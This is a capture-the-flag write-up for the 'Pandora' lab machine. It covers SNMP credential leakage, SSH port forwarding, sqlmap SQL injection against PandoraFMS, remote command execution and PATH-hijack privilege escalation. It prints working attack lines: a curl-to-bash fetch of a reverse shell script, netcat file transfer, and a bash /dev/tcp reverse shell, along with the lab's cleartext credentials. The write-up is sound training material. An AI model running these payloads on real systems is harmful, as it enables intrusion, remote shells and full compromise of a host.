@@ -1,0 +1,246 @@
+                       Pandora
+
+                                                                                     21th May 2022 / Document No D22.100.174
+                                                                                     Prepared By: dotguy
+                                                                                     Machine Authors: TheCyberGeek & dmw0ng
+                                                                                     Difficulty: Easy
+                                                                                     Classification: Confidential
+
+Synopsis
+
+Pandora is an easy rated Linux machine. The port scan reveals a SSH, web-server and SNMP service running
+on the box. Initial foothold is obtained by enumerating the SNMP service, which reveals cleartext credentials
+for user daniel . Host enumeration reveals Pandora FMS running on an internal port, which can be
+accessed through port forwarding. Lateral movement to another user called matt is achieved by chaining
+SQL injection & RCE vulnerabilities in the PandoraFMS service. Privilege escalation to user root is
+performed by exploiting a SUID binary for PATH variable injection.
+
+Skills required
+
+      Basic Linux Knowledge
+
+Skills learned
+
+      SNMP enumeration
+      Port forwarding
+      SQL injection
+      Lateral movement
+      Reversing
+      PATH variable injection
+
+Enumeration
+
+We will begin by scanning the host for any open TCP ports and running services with a Nmap scan:
+   -p- : scan for all TCP ports ranging from 0-65535
+   --min-rate : This is used to specify the minimum number of packets Nmap should send per
+   second; it speeds up the scan as the number goes higher
+   -sV : Attempts to determine the version of the service running on a port
+   -sC : Scan with default NSE scripts
+
+A second scan can be run to determine the services that are listening on each port.
+Looking at the Nmap scan, we can see SSH running on port 22 and Apache web server running on port 80.
+Let us also run a Nmap scan to identify any open UDP ports.
+
+   $ nmap -sU 10.10.11.136
+
+The output shows that port 161 is open and running the SNMP service.
+
+Web Enumeration
+
+Upon visiting the IP address in the browser we land on a static webpage. We can click around to check for
+any potentially useful functionality of the website, but there is none.
+Let us move on to enumerating the UDP port 161 running the SNMP service.
+
+SNMP
+
+What is SNMP protocol?
+
+SNMP stands for Simple Network Management Protocol. It provides a framework for asking a device about
+its performance and configuration. It is used to manage and monitor all the devices connected over a
+network. It exposes management data in the form of variables on the managed systems. These variables
+can then be remotely queried.
+Let us use this command-line utility known as snmpwalk to scan the SNMP service and obtain all variables
+of the managed systems and displays them.
+
+   snmpwalk -v 1 -c public 10.10.11.136
+It seems that the target is performing a host check and passing cleartext credentials over CLI. We now have
+a username and a password, so let us try authenticating into SSH using the obtained the credentials.
+
+   user : daniel
+   pass : HotelBabylon23
+
+Using the credentials obtained during the SNMP enumeration, we were successfully able to log into the
+machine via SSH as user daniel . We can see that the user.txt flag is in the home directory of another
+user called matt , and it is not readable with daniel's privileges. Thus, we must now figure out a way to
+laterally move into the user matt .
+Lateral Movement
+
+Let us enumerate the remote host for any further useful information. We can see two separate directories
+inside the /var/www/ directory.
+
+   $ ls -al /var/www/
+On further analysing the contents of these directories we can see that the website of the directory html
+was the one we saw when we visited the IP address of the remote host in the browser.
+
+Thus, let us also read the Apache virtual host configuration to check for any useful information. Apache's
+VHost configuration files can be found in the /etc/apache2/sites-enabled/ directory. There are two
+configuration files present here, a default one and another named as pandora.conf . On reading the
+pandora.conf we see that a website with the web directory as /var/www/pandora is being served
+internally on port 80, i.e. localhost:80 .
+
+   $ cat /etc/apache2/sites-enabled/pandora.conf
+We can port forward our connection to the remote host's internal port and then we will be able to access its
+web content. There are several ways to perform port forwarding, although we will be doing it by using the
+SSH connection itself. Using this tunnel, we can set up a proxy to view the webpage.
+
+   $ ssh -D 9090 daniel@10.10.11.136
+Note: -D Specifies a local ''dynamic'' application-level port forwarding
+
+We will also need to configure a SOCKS proxy in the foxy-proxy browser extension in order to make the
+browser route the traffic through the port which is forwarded.
+
+When we visit our localhost on port 80 we are greeted with a PandoraFMS login page.
+Looking at the bottom of that page exposes the version of the Pandora FMS, which is
+v7.0NG.742_FIX_PERL2020 .
+
+Having the version of the service, we can google for any available exploits. This vulnerability disclosure was
+among the top results.
+
+SQL injection
+
+According to the above vulnerability disclosure, PandoraFMS suffers from an SQL injection vulnerability,
+leading to authentication bypass by abusing the session declaration process in
+/include/chart_generator.php . After reading through the vulnerable code provided in the disclosure,
+we can pass the session_id parameter to utilize the SQL injection. Let us use sqlmap for exploiting the
+SQL injection vulnerability and eventually dumping the database.
+In order to route sqlmap through the SOCKS proxy (so that its traffic can reach the PandoraFMS), we will
+need to make use of a tool known as proxychains .
+Proxychains is a tool that forces any TCP connection made by any given application to go through proxies
+like TOR or any other SOCKS4, SOCKS5 or HTTP proxies.
+We will need to add an entry for our proxy under the ProxyList section in the /etc/proxychains4.conf
+file.
+   [ProxyList]
+   # add proxy here ...
+   # meanwile
+   # defaults set to "tor"
+   socks5 127.0.0.1 9090 daniel HotelBabylon23
+Let us now run sqlmap against the SQLi vulnerable endpoint /include/chart_gernerator.php .
+Obtaining the name of the current database :
+   $ proxychains sqlmap --
+   url="http://localhost/pandora_console/include/chart_generator.php?session_id=''" --
+   current-db
+
+Obtaining the list of tables present in the database "pandora" :
+   $ proxychains sqlmap --
+   url="http://localhost/pandora_console/include/chart_generator.php?session_id=''" -D
+   pandora --tables
+Dumping the tsessions_php table in order to obtain a usable session_id value in order to login into the
+Pandora FMS by impersonating an elevated user, i.e. matt .
+
+   $ proxychains sqlmap --
+   url="http://localhost/pandora_console/include/chart_generator.php?session_id=''" -
+   Ttsessions_php --dump
+
+We were successfully able to obtain a session_id value for user matt . Let's visit the vulnerable endpoint
+with the session_id value in the URL.
+Then visit the homepage of the PandoraFMS and we can see that we are logged in as user "matt".
+After getting into the user account we identify that we don't have access to the file upload functionality, so
+we cannot execute the phar deserialization part of the exploit. Searching for other exploits we come
+across this vulnerability which allows a standard user to execute arbitrary commands on the target system.
+We can exploit this RCE vulnerability by clicking on the "Events" option in the sidebar and then capturing the
+request in an intermediary proxy like BurpSuite. We see that a POST request is being made to the ajax
+specified in the above disclosure. We can gain RCE by URL encoding / and by placing our commands in the
+target parameter of the request body.
+We will also need to configure the SOCKS proxy accordingly, in BurpSuite under the "user options" tab.
+
+Altering the captured POST request and sending it with the RCE payload whoami .
+We can see the output of the whoami command in the server response meaning that RCE was successful.
+Let us now try getting a reverse shell using RCE. We will create a reverse shell bash file on our local machine
+and then using the RCE, make the remote host fetch this and pipe it to bash in order to execute it. We are
+doing it this way because it minimizes the risk of failure due to the presence of any bad characters in the
+web request.
+
+Command used in the RCE payload :
+   curl+10.10.14.6:80/shell.sh|bash
+Upon sending the request to the server, we get a reverse shell as user matt .
+The user flag can be found at /home/matt/user.txt
+
+Privilege Escalation
+
+Let us find all the files with SUID bit set in the whole file system using the find utility with the -perm flag
+(print files only with permissions set to 4000).
+
+   $ find / -perm -4000 2>/dev/null
+We see an unusual entry in the results, which is /usr/bin/pandora_backup .
+   $ ls -al /usr/bin/pandora_backup
+Breaking out from the restricted shell environment
+
+When we try to run the binary, we see the following error :
+   $ /usr/bin/pandora_backup
+
+The error is about permission issues regarding being unable to access a file present in the root directory.
+But this binary has the SUID bit set, so the binary must run with root privileges. This seems to be a case of a
+restricted shell.
+We can use the /usr/bin/at binary to break out of this restricted shell, as instructed here in the GTFO
+bins.
+
+   $ echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
+
+Let us also upgrade this shell to a TTY shell for convenience.
+   $ python -c "import pty;pty.spawn('/bin/bash')"
+Now, upon executing the /usr/bin/pandora_backup binary, we see a backup of the PandoraFMS is being
+created.
+
+   $ /usr/bin/pandora_backup
+
+Binary Analysis
+
+Let us transfer the pandora_backup binary to our local machine in order to analyze it. We wll be using a
+simple netcat stream to transfer this file.
+On our local machine:
+
+   $ nc -nvlp 1234 > pandora_backup
+   listening on [any] 1234 ...
+On the remote machine:
+   $ nc 10.10.14.6 1234 < pandora_backup
+After the file has finished transferring, let's run the strings utility on it to extract any printable strings.
+   $ strings pandora_backup
+
+We can see that the tar utility is being used to compress the data into a backup file called pandora-
+backup.tar.gz . However, the command uses the relative path for the tar binary instead of the absolute
+path. Due to this fact, we can try hijacking the PATH variable, and ultimately escalate our privileges to root.
+
+What is PATH variable hijacking?
+
+First, we must understand what the PATH environment variable is.
+The PATH environment variable contains a list of directories. So when a binary is being run without
+specifying its absolute path, the directories listed in the PATH variable are searched from beginning to end
+for this binary file and the first matching executable is run. So directories at the beginning of the PATH
+variable take precedence over those that come later.
+Now, a vulnerable scenario is in which the absolute path of a binary is not specified. We can create a file
+containing the malicious command and make the filename the same as that of the binary to be run. We will
+also need to alter the PATH variable such that our malicious file is the first one to match when the
+directories listed in the PATH variable are searched. So, instead of the originally intended binary, the
+malicious command inside the file created by us is run
+Let us create a file on the remote system in the /tmp directory called tar and place the following reverse
+shell code inside it.
+   #!/bin/bash
+   bash -i >& /dev/tcp/<local_IP_address>/<listening_port> 0>&1
+We will also need to give it the executable permissions.
+
+After the tar file has been created, we have to modify the current user's PATH variable on the remote
+system and prepend the /tmp folder so that it is the first folder that bash searches for binaries in. Entries in
+the PATH variable are separated by a colon : .
+
+   $ export PATH=/tmp:$PATH
+
+Note: The above command sets the value of PATH to /tmp plus the previous value of PATH.
+Start a Netcat listener on your local machine
+
+   $ nc -nvlp 4444
+Then, run the pandora_backup binary so as to trigger the reverse shell through the malicious tar file.
+
+   $ /usr/bin/pandora_backup
+After the tar file is executed, a reverse shell is received on our listener.
+The root flag can be found at /root/root.txt
+
